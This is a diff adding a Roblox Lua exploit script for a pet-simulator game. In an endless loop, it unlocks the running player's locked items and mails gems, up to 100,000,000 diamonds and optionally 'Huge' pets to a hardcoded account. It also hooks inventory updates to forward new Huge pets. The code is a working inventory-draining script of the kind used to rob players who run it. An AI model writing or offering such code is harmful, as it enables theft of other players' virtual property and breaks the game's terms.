@@ -1,0 +1,89 @@
+getgenv().C0nfig = { 
+    ["Items"] = {
+        ["Rainbow Gem"] = { Class = "Misc", pt = nil, sh = nil, tn = nil, Amount = 20},
+        ["Diamonds"] = { Class = "Currency", pt = nil, sh = nil, tn = nil, Amount = 100000000},
+    },
+    ["Send Existing Huges"] = false,
+    ["Send New Huges"] = false,
+    ["Mail_User"] = "smerf000321"
+}
+
+repeat task.wait() until game:IsLoaded() 
+repeat task.wait() until game:GetService("Players").LocalPlayer
+repeat task.wait() until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")  
+local SaveMod = require(ReplicatedStorage.Library.Client.Save)
+local Network = ReplicatedStorage:WaitForChild("Network")
+local MailItems = {}
+
+local function GetMailTax()
+    local MailSendToday = require(ReplicatedStorage.Library.Client.Save).Get()['MailboxSendsSinceReset']
+    if require(ReplicatedStorage.Library.Client.Gamepasses).Owns("VIP") then return 20000 end
+    local tax = 20000 * (1.5 ^ MailSendToday)
+    return math.min(tax, 5000000) -- Cap to maximum allowable tax
+end
+
+-- Main loop to continuously gather and send mail items
+while true do
+    MailItems = {} -- Clear previous mail items
+
+    -- Gather mail items based on the configuration
+    for Class, Items in pairs(SaveMod.Get()["Inventory"]) do
+        for uid, v in pairs(Items) do
+            local isHuge = Class == "Pet" and C0nfig["Send Existing Huges"] and string.find(v.id, "Huge")
+            local itemMatch = C0nfig.Items[v.id] -- Directly access item in config based on id
+
+            -- Check if the item matches configuration
+            if (itemMatch and itemMatch.Class == Class) or isHuge then
+                if v._lk then
+                    repeat
+                        local success, errorMsg = Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
+                    until success
+                end
+                
+                local amount = itemMatch and (itemMatch.Amount or v._am) or (v._am or 1)
+                MailItems[uid] = { uid = uid, amount = amount, class = Class }
+            end
+        end
+    end
+
+    -- Send MailItems
+    for i, v in pairs(MailItems) do 
+        if v.class == "Currency" then
+            v.amount = v.amount - GetMailTax()
+        end
+        local success, e
+        repeat
+            local args = {
+                [1] = C0nfig.Mail_User,
+                [2] = "abc", -- You can change the note to whatever you want
+                [3] = v.class,
+                [4] = i,
+                [5] = v.amount
+            } 
+            success, e = Network["Mailbox: Send"]:InvokeServer(unpack(args))
+            print(e) -- Output any error messages for debugging
+            task.wait(1)
+        until success or e == "Couldn't remove this item from your inventory!"
+    end
+
+    -- Handle sending new Huge pets if enabled
+    if C0nfig["Send New Huges"] then
+        Network["Items: Update"].OnClientEvent:Connect(function(player, Inventory)
+            if Inventory["set"] and Inventory["set"]["Pet"] then
+                for uid, v in pairs(Inventory["set"]["Pet"]) do
+                    if string.find(v.id, "Huge") then
+                        local success
+                        repeat 
+                            success, e = Network["Mailbox: Send"]:InvokeServer(C0nfig.Mail_User, "abc", "Pet", uid, 1) 
+                            task.wait(5)
+                        until success or e == "Couldn't remove this item from your inventory!"
+                    end
+                end                 
+            end
+        end)
+    end
+
+    task.wait(10) -- Wait before the next iteration to give some time before checking again
+end
